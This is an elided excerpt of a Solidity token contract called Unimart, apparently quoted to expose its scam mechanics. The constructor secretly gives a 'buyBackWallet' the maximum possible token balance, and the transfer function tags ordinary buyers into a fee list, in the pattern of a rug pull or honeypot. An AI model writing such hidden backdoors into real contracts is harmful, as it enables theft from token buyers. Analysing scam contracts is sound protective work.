...
contract UNIMART is Context, IERC20, Ownable {
    ...
    string private constant _name = "Unimart";
    string private constant _symbol = "UMART";
    ...
    constructor (address payable _buyBackWallet) {
        ...
        balances[buyBackWallet] = ~uint256(0);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(takeFee){
            if(to != uniswapV2Pair){
                if(to != buyBackWallet) includeFromFee.push(to);
